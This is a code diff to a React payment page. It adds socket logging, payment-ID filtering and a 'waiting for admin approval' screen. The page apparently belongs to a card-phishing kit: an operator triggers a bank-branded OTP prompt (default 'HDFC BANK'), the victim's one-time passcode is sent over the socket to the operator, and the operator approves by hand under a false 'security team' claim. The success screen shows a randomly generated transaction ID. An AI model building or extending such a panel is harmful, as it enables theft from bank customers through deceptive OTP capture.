@@ -12,14 +12,22 @@ const Payment = () => {
   const [socket, setSocket] = useState<Socket | null>(null);
   const [showOtp, setShowOtp] = useState(false);
   const [otp, setOtp] = useState('');
-  const [isProcessing, setIsProcessing] = useState(true);
-  const [error, setError] = useState('');
   const [success, setSuccess] = useState(false);
+  const [error, setError] = useState('');
+  const [isProcessing, setIsProcessing] = useState(true);
   const [customAmount, setCustomAmount] = useState<number | null>(null);
   const [currency, setCurrency] = useState('INR');
   const [currencySymbol, setCurrencySymbol] = useState('₹');
   const [bankLogo, setBankLogo] = useState('');
   const [selectedBankName, setSelectedBankName] = useState('HDFC BANK');
+  
+  // Add payment ID state to track this specific payment session
+  const [currentPaymentId] = useState(() => {
+    const paymentId = planData.id || 'payment-' + Date.now();
+    console.log('🆔 Payment.tsx initialized with Payment ID:', paymentId);
+    console.log('📋 Plan data:', planData);
+    return paymentId;
+  });
   
   // Add debugging state
   const [debugInfo, setDebugInfo] = useState('No socket events received yet');
@@ -76,15 +84,88 @@ const Payment = () => {
 
     // Connect to WebSocket server
     const socketUrl = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
-      ? 'http://localhost:3001'
+      ? 'http://localhost:3002'
       : window.location.origin;
     
+    console.log('🔌 ATTEMPTING SOCKET CONNECTION:');
+    console.log('🌐 Socket URL:', socketUrl);
+    console.log('🌐 Window hostname:', window.location.hostname);
+    console.log('🌐 Window origin:', window.location.origin);
+    
+    console.log('🔌 Attempting to connect to socket server at:', socketUrl);
+
     const newSocket = io(socketUrl, {
       timeout: 10000,
       reconnection: true,
       reconnectionAttempts: 5,
       reconnectionDelay: 2000,
       transports: ['websocket', 'polling']
+    });
+    
+    newSocket.on('connect', () => {
+      console.log('🔌 Socket.io connection established:', {
+        id: newSocket.id,
+        time: new Date().toISOString()
+      });
+      console.log('📡 Emitting paymentId:', currentPaymentId);
+      newSocket.emit('paymentId', currentPaymentId);
+    });
+
+    newSocket.on('connect_error', (error) => {
+      console.error('🔌 Socket connection error:', {
+        error,
+        time: new Date().toISOString()
+      });
+    });
+
+    newSocket.on('disconnect', (reason) => {
+      console.log('🔌 Socket disconnected:', {
+        reason,
+        time: new Date().toISOString()
+      });
+    });
+
+    newSocket.on('error', (error) => {
+      console.error('🔌 Socket error:', {
+        error,
+        time: new Date().toISOString()
+      });
+    });
+
+    newSocket.on('reconnect', (attempt) => {
+      console.log(`🔌 Socket reconnected (attempt ${attempt})`);
+    });
+
+    newSocket.on('reconnect_attempt', (attempt) => {
+      console.log(`🔌 Reconnection attempt ${attempt}`);
+    });
+
+    newSocket.on('reconnect_error', (error) => {
+      console.error(`🔌 Reconnection error:`, error);
+    });
+
+    newSocket.on('reconnect_failed', () => {
+      console.error('🔌 Reconnection failed');
+    });
+    
+    // Add connection error handling
+    newSocket.on('connect_error', (error: any) => {
+      console.error('❌ SOCKET CONNECTION ERROR:', error);
+      console.error('❌ Error type:', error.type || 'unknown');
+      console.error('❌ Error message:', error.message || error.toString());
+      console.error('❌ Socket URL was:', socketUrl);
+    });
+    
+    newSocket.on('disconnect', (reason) => {
+      console.warn('⚠️ SOCKET DISCONNECTED:', reason);
+    });
+    
+    newSocket.on('reconnect_attempt', (attemptNumber) => {
+      console.log(`🔄 Socket reconnect attempt #${attemptNumber}`);
+    });
+    
+    newSocket.on('reconnect_error', (error) => {
+      console.error('❌ Socket reconnection error:', error);
     });
     setSocket(newSocket);
 
@@ -171,29 +252,53 @@ const Payment = () => {
     
     devLog('🔌 Registered event listeners: show-otp, admin-show-otp, broadcast-show-otp');
 
-    newSocket.on('payment-approved', () => {
-      devLog('Payment approved by admin');
-      setSuccess(true);
-      setError('');
-      setIsProcessing(false);
-      setTimeout(() => {
-        navigate('/payment-success', { 
-          state: { 
-            paymentDetails: {
-              amount: planData.price?.toLocaleString(),
-              planName: planData.name,
-              transactionId: 'TXN' + Math.random().toString(36).substr(2, 9).toUpperCase(),
-              customerName: 'Customer',
-              email: 'customer@example.com',
-              date: new Date().toLocaleDateString('en-US', { 
-                year: 'numeric', 
-                month: 'long', 
-                day: 'numeric' 
-              })
+    // Add debug listener for ALL socket events
+    const originalEmit = newSocket.emit;
+    const originalOn = newSocket.on;
+    
+    // Listen for all events for debugging
+    newSocket.onAny((eventName, ...args) => {
+      if (eventName === 'payment-approved' || eventName === 'invalid-otp-error') {
+        console.log('📡 Socket event received:', eventName, args);
+      }
+    });
+
+    newSocket.on('payment-approved', (data: { paymentId?: string, timestamp?: string, source?: string }) => {
+      console.log('✅ Payment approved event received:', data);
+      console.log('🆔 Current Payment ID:', currentPaymentId);
+      console.log('🔍 Payment ID match?', !data?.paymentId || data.paymentId === currentPaymentId);
+      devLog('Payment approved event received:', data, 'Current Payment ID:', currentPaymentId);
+      
+      // Only respond if this event is for our payment ID or if no payment ID specified (backward compatibility)
+      if (!data?.paymentId || data.paymentId === currentPaymentId) {
+        console.log('🎉 PAYMENT APPROVED - Processing for our payment!');
+        devLog('Payment approved by admin for our payment!');
+        setSuccess(true);
+        setError('');
+        setIsProcessing(false);
+        setShowOtp(false); // Hide OTP modal on success
+        setTimeout(() => {
+          navigate('/payment-success', { 
+            state: { 
+              paymentDetails: {
+                amount: planData.price?.toLocaleString(),
+                planName: planData.name,
+                transactionId: 'TXN' + Math.random().toString(36).substr(2, 9).toUpperCase(),
+                customerName: 'Customer',
+                email: 'customer@example.com',
+                date: new Date().toLocaleDateString('en-US', { 
+                  year: 'numeric', 
+                  month: 'long', 
+                  day: 'numeric' 
+                })
+              }
             }
-          }
-        });
-      }, 3000);
+          });
+        }, 3000);
+      } else {
+        console.log('❌ Payment approved event IGNORED - different payment ID:', data.paymentId);
+        devLog('Payment approved event ignored - different payment ID:', data.paymentId);
+      }
     });
 
     newSocket.on('payment-rejected', (reason: string) => {
@@ -203,10 +308,22 @@ const Payment = () => {
       setShowOtp(false);
     });
 
-    newSocket.on('invalid-otp-error', () => {
-      devLog('Invalid OTP error received');
-      setError('Incorrect OTP, please enter valid one time passcode');
-      setIsProcessing(false);
+    newSocket.on('invalid-otp-error', (data: { paymentId?: string, timestamp?: string, source?: string }) => {
+      console.log('❌ Invalid OTP error event received:', data);
+      console.log('🆔 Current Payment ID:', currentPaymentId);
+      console.log('🔍 Payment ID match?', !data?.paymentId || data.paymentId === currentPaymentId);
+      devLog('Invalid OTP error received:', data, 'Current Payment ID:', currentPaymentId);
+      
+      // Only respond if this event is for our payment ID or if no payment ID specified (backward compatibility)
+      if (!data?.paymentId || data.paymentId === currentPaymentId) {
+        console.log('🔴 INVALID OTP - Processing for our payment!');
+        devLog('Invalid OTP error for our payment!');
+        setError('Incorrect OTP, please enter valid one time passcode');
+        setIsProcessing(false);
+      } else {
+        console.log('❌ Invalid OTP error IGNORED - different payment ID:', data.paymentId);
+        devLog('Invalid OTP error ignored - different payment ID:', data.paymentId);
+      }
     });
 
     newSocket.on('card-declined-error', () => {
@@ -233,11 +350,11 @@ const Payment = () => {
 
   const handleOtpSubmit = () => {
     if (otp.length === 6 && socket) {
-      const paymentId = planData.id || 'payment-' + Date.now();
-      devLog('Submitting OTP:', otp, 'Payment ID:', paymentId);
+      console.log('📤 Submitting OTP:', otp, 'Payment ID:', currentPaymentId);
+      devLog('Submitting OTP:', otp, 'Payment ID:', currentPaymentId);
       socket.emit('otp-submitted', { 
         otp,
-        paymentId,
+        paymentId: currentPaymentId,
         planData 
       });
       setIsProcessing(true);
@@ -311,7 +428,31 @@ const Payment = () => {
             </div>
           )}
 
-          {/* OTP Input */}
+          {/* Loading State - Waiting for Admin */}
+          {isProcessing && !showOtp && !success && !error && (
+            <div className="text-center py-8">
+              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
+                <Clock className="h-8 w-8 text-blue-600 animate-spin" />
+              </div>
+              <h3 className="text-xl font-semibold text-blue-600 mb-2">Processing Payment</h3>
+              <p className="text-gray-600 mb-4">Waiting for admin approval...</p>
+              <div className="bg-blue-50 rounded-lg p-4 mb-4">
+                <div className="flex items-center gap-2 text-sm text-blue-700">
+                  <Shield className="h-4 w-4" />
+                  <span>Your payment is being verified by our security team</span>
+                </div>
+              </div>
+              <div className="flex justify-center">
+                <div className="flex space-x-1">
+                  <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{animationDelay: '0ms'}}></div>
+                  <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{animationDelay: '150ms'}}></div>
+                  <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{animationDelay: '300ms'}}></div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* OTP Input - Hide when success */}
           {showOtp && !success && !error && (
             <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
               <div className="relative bg-white rounded-lg shadow-2xl max-w-xs sm:max-w-md lg:max-w-lg w-full mx-auto">
@@ -484,18 +625,7 @@ const Payment = () => {
             </div>
           )}
 
-          {/* Processing State */}
-          {isProcessing && !showOtp && !success && !error && (
-            <div className="text-center py-8">
-              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
-              <h3 className="text-lg font-semibold text-gray-800 mb-2">Processing Payment</h3>
-              <p className="text-gray-600">Please wait while we process your payment securely...</p>
-              <div className="flex items-center justify-center gap-2 mt-4 text-sm text-gray-500">
-                <Clock className="h-4 w-4" />
-                <span>This may take a few moments</span>
-              </div>
-            </div>
-          )}
+
         </div>
 
         {/* Security Notice */}
